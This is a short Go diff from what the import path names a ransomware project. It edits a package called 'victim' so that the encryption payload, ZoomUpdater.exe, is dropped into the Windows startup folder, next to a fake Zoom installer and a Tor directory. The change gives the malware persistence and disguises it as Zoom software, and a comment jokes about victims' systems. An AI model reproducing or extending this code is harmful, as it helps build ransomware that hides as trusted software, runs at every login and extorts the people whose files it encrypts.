@@ -3,6 +3,7 @@ package victim
 import (
     "os"
 
+    "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/errors"
 )
 
@@ -20,9 +21,7 @@ var (
 
     torDirectory  = workDir + `\Tor`
     zoomInstaller = tempDir + `\ZoomInstaller.exe`
-    cryptoDir     = workDir + `\ZoomUpdater`
-    cryptoZip     = workDir + `\ZoomUpdater.zip`
-    cryptoPayload = workDir + cryptoDir + `\ZoomUpdater.exe`
+    cryptoPayload = win.StartupFolder() + `\ZoomUpdater.exe`
 
     // cast magicBytes to array lol, very safe indeed
     // all victims will be on little endian systems anyway
